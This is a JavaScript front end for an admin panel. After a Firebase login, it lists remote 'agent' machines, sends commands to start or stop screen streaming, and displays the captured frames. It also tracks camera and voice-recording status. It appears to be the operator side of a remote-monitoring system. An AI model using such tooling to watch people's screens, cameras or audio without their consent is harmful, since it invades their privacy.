import firebase from 'https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js';
import 'https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js';
import { io } from 'https://cdn.socket.io/4.7.5/socket.io.esm.min.js';
// test
const els = {
  loginView: document.getElementById('login-view'),
  viewerView: document.getElementById('viewer-view'),
  loginForm: document.getElementById('login-form'),
  loginEmail: document.getElementById('login-email'),
  loginPassword: document.getElementById('login-password'),
  loginFeedback: document.getElementById('login-feedback'),
  loginSubmit: document.getElementById('login-submit'),
  connectionStatus: document.getElementById('connection-status'),
  controlFeedback: document.getElementById('control-feedback'),
  logoutButton: document.getElementById('logout-button'),
  agentSelect: document.getElementById('agent-select'),
  agentHelper: document.getElementById('agent-helper'),
  startStream: document.getElementById('start-stream'),
  stopStream: document.getElementById('stop-stream'),
  preview: document.getElementById('stream-preview'),
  frameTimestamp: document.getElementById('frame-timestamp'),
  metaResolution: document.getElementById('meta-resolution'),
  metaAgent: document.getElementById('meta-agent'),
  metaFrameAge: document.getElementById('meta-frame-age'),
  viewerUser: document.getElementById('viewer-user')
};

const state = {
  firebaseReady: false,
  socket: null,
  agents: [],
  agentState: {},
  selectedAgentId: '',
  currentUser: null,
  reconnecting: false,
  lastFrameAt: 0
};

const apiBaseUrl = `${window.location.protocol}//${window.location.host}`;

const normalizeFirebaseError = (error) => {
  const code = String(error?.code || '').replace(/^auth\//, '');
  const messages = {
    'invalid-credential': 'Invalid email or password.',
    'wrong-password': 'Invalid email or password.',
    'user-not-found': 'Invalid email or password.',
    'invalid-email': 'Please enter a valid email.',
    'user-disabled': 'Account disabled. Contact support.',
    'too-many-requests': 'Too many attempts. Try again later.',
    'network-request-failed': 'Network error. Check your connection.'
  };
  if (messages[code]) {
    return messages[code];
  }
  return (error?.message || 'Authentication failed. Please try again.').replace(/^Firebase:\s*/i, '');
};

const setView = (view) => {
  if (view === 'viewer') {
    els.viewerView.classList.remove('hidden');
    els.loginView.classList.add('hidden');
  } else {
    els.loginView.classList.remove('hidden');
    els.viewerView.classList.add('hidden');
  }
};

const setStatus = (message, type = '') => {
  els.connectionStatus.textContent = message;
  els.connectionStatus.classList.remove('ok', 'error');
  if (type) {
    els.connectionStatus.classList.add(type);
  }
};

const setControlFeedback = (message, type = '') => {
  els.controlFeedback.textContent = message || '';
  els.controlFeedback.classList.remove('ok', 'warn', 'error');
  if (['ok', 'warn', 'error'].includes(type)) {
    els.controlFeedback.classList.add(type);
  }
};

const setLoginFeedback = (message, type = '') => {
  els.loginFeedback.textContent = message || '';
  els.loginFeedback.classList.remove('ok', 'warn', 'error');
  if (['ok', 'warn', 'error'].includes(type)) {
    els.loginFeedback.classList.add(type);
  }
};

const formatAgentOption = (agent) => {
  const status = agent.screenStreaming ? 'STREAMING' : 'IDLE';
  return `${agent.machine} (${agent.id.slice(0, 6)}) • ${status}`;
};

const updateAgentHelper = () => {
  if (!state.selectedAgentId) {
    els.agentHelper.textContent = 'Select a device to start streaming.';
    return;
  }
  const agent = state.agents.find((a) => a.id === state.selectedAgentId);
  if (!agent) {
    els.agentHelper.textContent = 'Selected device went offline. Choose another.';
    return;
  }
  const runtime = state.agentState[state.selectedAgentId];
  const streaming = runtime?.screenStreaming;
  els.agentHelper.textContent = `${agent.machine} is ${streaming ? 'currently streaming.' : 'ready.'}`;
};

const updateControlButtons = () => {
  const hasSocket = Boolean(state.socket && state.socket.connected);
  const hasSelection = Boolean(state.selectedAgentId);
  const selectedState = state.agentState[state.selectedAgentId];
  const streaming = Boolean(selectedState?.screenStreaming);

  els.startStream.disabled = !hasSocket || !hasSelection || streaming;
  els.stopStream.disabled = !hasSocket || !hasSelection || !streaming;
};

const updateAgentOptions = () => {
  const select = els.agentSelect;
  select.innerHTML = '';

  if (!state.agents.length) {
    const option = document.createElement('option');
    option.value = '';
    option.textContent = 'No devices online';
    select.appendChild(option);
    state.selectedAgentId = '';
    updateAgentHelper();
    updateControlButtons();
    return;
  }

  state.agents.forEach((agent) => {
    const option = document.createElement('option');
    option.value = agent.id;
    option.textContent = formatAgentOption(agent);
    if (agent.id === state.selectedAgentId) {
      option.selected = true;
    }
    select.appendChild(option);
  });

  if (!state.selectedAgentId || !state.agents.some((agent) => agent.id === state.selectedAgentId)) {
    state.selectedAgentId = state.agents[0].id;
    select.value = state.selectedAgentId;
  }

  updateAgentHelper();
  updateControlButtons();
};

const resetPreview = () => {
  els.preview.src = '';
  els.frameTimestamp.textContent = 'Waiting...';
  els.metaResolution.textContent = '—';
  els.metaAgent.textContent = '—';
  els.metaFrameAge.textContent = '—';
  state.lastFrameAt = 0;
};

const formatAgo = (timestamp) => {
  if (!timestamp) {
    return '—';
  }
  const diff = Math.max(0, Date.now() - timestamp);
  if (diff < 1000) {
    return 'Just now';
  }
  if (diff < 60 * 1000) {
    return `${Math.round(diff / 1000)}s ago`;
  }
  const minutes = Math.round(diff / 60000);
  return `${minutes}m ago`;
};

const updateFrameAge = () => {
  els.metaFrameAge.textContent = formatAgo(state.lastFrameAt);
};

const handleStreamFrame = (data = {}) => {
  if (!data?.image) {
    return;
  }

  if (state.selectedAgentId && data.agentId && data.agentId !== state.selectedAgentId) {
    return;
  }

  const frameUrl = `data:image/jpeg;base64,${data.image}`;
  els.preview.src = frameUrl;
  state.lastFrameAt = Date.now();
  els.frameTimestamp.textContent = `Last frame: ${new Date(state.lastFrameAt).toLocaleTimeString()}`;
  if (data.width && data.height) {
    els.metaResolution.textContent = `${data.width}×${data.height}`;
  } else {
    els.metaResolution.textContent = 'Unknown';
  }
  if (data.machine && data.agentId) {
    els.metaAgent.textContent = `${data.machine} (${data.agentId.slice(0, 6)})`;
  }
  updateFrameAge();
};

const disconnectSocket = () => {
  if (state.socket) {
    if (typeof state.socket.removeAllListeners === 'function') {
      state.socket.removeAllListeners();
    }
    state.socket.disconnect();
    state.socket = null;
  }
  setStatus('Disconnected', 'error');
  resetPreview();
  updateControlButtons();
};

const connectSocket = async (user) => {
  if (!user) {
    disconnectSocket();
    return;
  }

  const token = await user.getIdToken(/* forceRefresh */ true);
  disconnectSocket();

  const socket = io(apiBaseUrl, {
    transports: ['websocket', 'polling'],
    autoConnect: false,
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    timeout: 20000
  });
  socket.auth = { token, clientType: 'stream-viewer' };
  state.socket = socket;

  socket.on('connect', () => {
    setStatus(`Connected: ${socket.id}`, 'ok');
    setControlFeedback('Connected to live stream relay.', 'ok');
    updateControlButtons();
  });

  socket.on('connect_error', (error) => {
    setStatus(`Connection error: ${error.message}`, 'error');
    setControlFeedback(`Socket error: ${error.message}`, 'error');
    updateControlButtons();
  });

  socket.on('disconnect', (reason) => {
    setStatus(`Disconnected: ${reason}`, 'error');
    setControlFeedback('Connection lost. Reconnecting...', 'warn');
    resetPreview();
    updateControlButtons();
  });

  socket.on('update_agent_list', (agents = []) => {
    state.agents = agents;
    agents.forEach((agent) => {
      state.agentState[agent.id] = {
        ...state.agentState[agent.id],
        screenStreaming: Boolean(agent.screenStreaming),
        machine: agent.machine
      };
    });
    updateAgentOptions();
  });

  socket.on('ui_agent_state', (data = {}) => {
    if (!data?.agentId) {
      return;
    }
    state.agentState[data.agentId] = {
      ...(state.agentState[data.agentId] || {}),
      recording: Boolean(data.recording),
      cameraOn: Boolean(data.cameraOn),
      voiceRecording: Boolean(data.voiceRecording),
      screenStreaming: Boolean(data.screenStreaming),
      machine: data.machine || state.agentState[data.agentId]?.machine
    };
    updateAgentHelper();
    updateControlButtons();
  });

  socket.on('ui_screen_stream_frame', handleStreamFrame);

  socket.on('ui_control_ack', (data = {}) => {
    if (!['start_screen_stream', 'stop_screen_stream'].includes(data.action)) {
      return;
    }
    if (data.ok) {
      setControlFeedback('Command delivered. Waiting for frame updates...', 'ok');
    } else {
      setControlFeedback('Command failed. Device may be offline.', 'warn');
    }
  });

  socket.connect();
};

const initFirebase = async () => {
  if (state.firebaseReady) {
    return;
  }

  try {
    const response = await fetch(`${apiBaseUrl}/firebase-config`);
    if (!response.ok) {
      throw new Error('Firebase config missing on server.');
    }
    const firebaseConfig = await response.json();
    firebase.initializeApp(firebaseConfig);
    state.firebaseReady = true;
    setLoginFeedback('Enter your admin credentials to continue.', 'ok');

    firebase.auth().onAuthStateChanged(async (user) => {
      state.currentUser = user;
      if (!user) {
        setView('login');
        els.viewerUser.textContent = '';
        disconnectSocket();
        return;
      }

      els.viewerUser.textContent = user.email || '';
      setView('viewer');
      setControlFeedback('Authenticating...');
      await connectSocket(user);
    });
  } catch (error) {
    console.error(error);
    setLoginFeedback(error.message || 'Failed to load Firebase configuration.', 'error');
    els.loginSubmit.disabled = true;
  }
};

const handleLoginSubmit = async (event) => {
  event.preventDefault();
  if (!state.firebaseReady) {
    await initFirebase();
    if (!state.firebaseReady) {
      return;
    }
  }

  const email = els.loginEmail.value.trim();
  const password = els.loginPassword.value;
  if (!email || !password) {
    setLoginFeedback('Enter email and password.', 'warn');
    return;
  }

  els.loginSubmit.disabled = true;
  setLoginFeedback('Signing in...');

  try {
    await firebase.auth().signInWithEmailAndPassword(email, password);
    els.loginPassword.value = '';
    setLoginFeedback('Login successful. Loading viewer...', 'ok');
  } catch (error) {
    setLoginFeedback(normalizeFirebaseError(error), 'error');
    els.loginSubmit.disabled = false;
  }
};

const handleLogout = async () => {
  if (!state.firebaseReady) {
    return;
  }
  await firebase.auth().signOut();
  els.loginSubmit.disabled = false;
  setLoginFeedback('Logged out. You can sign in again.', 'warn');
};

const startStream = () => {
  if (!state.socket || !state.socket.connected) {
    setControlFeedback('Socket offline. Please wait...', 'warn');
    return;
  }
  if (!state.selectedAgentId) {
    setControlFeedback('Select a device first.', 'warn');
    return;
  }
  state.socket.emit('admin_start_screen_stream', { targetId: state.selectedAgentId });
  setControlFeedback('Requested live stream start...');
};

const stopStream = () => {
  if (!state.socket || !state.socket.connected) {
    setControlFeedback('Socket offline. Please wait...', 'warn');
    return;
  }
  if (!state.selectedAgentId) {
    setControlFeedback('Select a device first.', 'warn');
    return;
  }
  state.socket.emit('admin_stop_screen_stream', { targetId: state.selectedAgentId });
  setControlFeedback('Requested live stream stop...');
};

const handleAgentChange = (event) => {
  state.selectedAgentId = event.target.value;
  resetPreview();
  updateAgentHelper();
  updateControlButtons();
};

els.loginForm.addEventListener('submit', handleLoginSubmit);
els.logoutButton.addEventListener('click', handleLogout);
els.startStream.addEventListener('click', startStream);
els.stopStream.addEventListener('click', stopStream);
els.agentSelect.addEventListener('change', handleAgentChange);

setInterval(updateFrameAge, 1000);
initFirebase();
